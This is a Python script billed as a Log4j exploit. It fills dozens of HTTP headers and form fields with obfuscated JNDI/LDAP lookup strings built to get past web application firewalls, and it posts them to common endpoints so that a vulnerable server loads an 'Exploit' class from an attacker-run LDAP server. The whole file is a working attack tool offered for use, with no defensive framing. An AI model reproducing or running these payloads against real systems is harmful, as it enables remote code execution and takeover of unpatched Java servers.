import argparse
from colorama import Fore, init
import requests 

#payloads to bypass Web Application Firewall
payloads=["${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{ldap_host}}:1389/Exploit}",
            "${${::-j}ndi:ldap://{{ldap_host}}:1389/Exploit}",
            "${${lower:jndi}:${lower:ldap}://{{ldap_host}}:1389/Exploit}",
            "${${lower:${lower:jndi}}:${lower:ldap}://{{ldap_host}}:1389/Exploit}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:ldap}://{{ldap_host}}:1389/Exploit}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:l}da${lower:p}://{{ldap_host}}:1389/Exploit}",
            "${jndi:ldap://{{ldap_host}}:1389/Exploit}"]

headers = [
"Accept-Charset","Accept-Datetime","Accept-Encoding","Accept-Language","Cache-Control",
"Cookie","DNT","Forwarded","Forwarded-For","Forwarded-For-Ip",
"Forwarded-Proto","From","Max-Forwards","Origin","Pragma","Referer","TE",
"True-Client-IP","Upgrade","User-Agent","Via","Warning","X-Api-Version",
"X-Att-Deviceid","X-ATT-DeviceId","X-Correlation-ID","X-Csrf-Token",
"X-CSRFToken","X-Do-Not-Track","X-Foo","X-Foo-Bar","X-Forwarded","X-Forwarded-By",
"X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Port",
"X-Forwarded-Proto","X-Forwarded-Protocol","X-Forwarded-Scheme","X-Forwarded-Server",
"X-Forwarded-Ssl","X-Forwarder-For","X-Forward-For","X-Forward-Proto",
"X-Frame-Options","X-From","X-Geoip-Country","X-Http-Destinationurl",
"X-Http-Host-Override","X-Http-Method","X-Http-Method-Override","X-HTTP-Method-Override",
"X-Http-Path-Override","X-Https","X-Htx-Agent","X-Hub-Signature","X-If-Unmodified-Since",
"X-Imbo-Test-Config","X-Insight","X-Ip","X-Ip-Trail","X-ProxyUser-Ip",
"X-Requested-With","X-Request-ID","X-UIDH","X-Wap-Profile","X-XSRF-TOKEN"
]

keys = [    "username",    "password",    "email",    "name",    "first_name",    "last_name",    "address",
        "phone",    "mobile",    "age",    "birthdate",    "gender",    "occupation",    "company",    "website",
        "country",    "state",    "city",    "zipcode",    "message",    "subject",    "comments",    "security_answer",
        "security_question",    "captcha",    "agree",    "terms",    "submit",    "login",    "register",    "uname"]

def getPayloads(ldap_host):
    new_payloads = []
    for i in payloads:
        new_payload = i.replace("{{ldap_host}}", ldap_host)
        new_payloads.append(new_payload)
    return new_payloads

def getFuzzingHeaders(payload):
    fuzzingHeaders = dict()
    for i in headers:
        fuzzingHeaders[i] = payload
    return fuzzingHeaders

def getFuzzingData(payload):
    data = dict()
    for i in keys:
        data[i] = payload
    return data

def postRequest(ip="localhost"):
    new_payloads = getPayloads(ip)
    endpoints = ['/form-action', '/submit', '/login', '/logout', '/register', 
        '/profile', '/forgot-password', '/search', '/create', '/update', '/delete', '/submit-payment']
    for payload in new_payloads:
        for i in endpoints:
            if ip=="localhost":
                lru = "http://"+ip+":8080"+i
            else:
                lru= ip+i
            request = requests.post(lru, headers=getFuzzingHeaders(payload), data=getFuzzingData(payload))
            if request.status_code == 200:
                print(request.json())

def getRequest(ip = "localhost"):
    new_payloads = getPayloads(ip)
    for payload in new_payloads:
        if ip=="localhost":
            lru = "http://"+ip+":8080"
        else:
            lru= ip
        request = requests.get(lru,headers=getFuzzingHeaders(payload))
        if request.status_code == 200:
            print(request.json())

def main():
    init(autoreset=True)
 
    parser = argparse.ArgumentParser(description='Log4j exploit')
    parser.add_argument('--ip',
                        metavar='ip',
                        type=str,
                        default='localhost',
                        help='Enter IP for LDAPRefServer & Shell')
    args = parser.parse_args()
    postRequest(args.ip)
    getRequest(args.ip)
    
if __name__ == "__main__":
    main()
